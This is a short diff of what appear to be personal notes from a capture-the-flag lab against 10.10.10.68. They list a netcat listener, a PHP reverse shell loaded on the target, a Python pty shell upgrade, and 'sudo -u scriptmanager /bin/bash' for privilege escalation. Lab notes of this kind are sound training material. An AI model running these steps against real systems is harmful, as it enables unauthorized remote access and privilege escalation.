@@ -52,7 +52,11 @@ wget na machine
 nc -nvlp 4445 (netcat)
 load 10.10.10.68/php-reverse-shell.php
 
+
 Goo: netsec spawning a TTY shell
+tty hell -> sudo -l
+ls -la
+
 https://netsec.ws/?p=337
 python -c 'import pty; pty.spawn("/bin/bash")'
 sudo -u scriptmanager /bin/bash
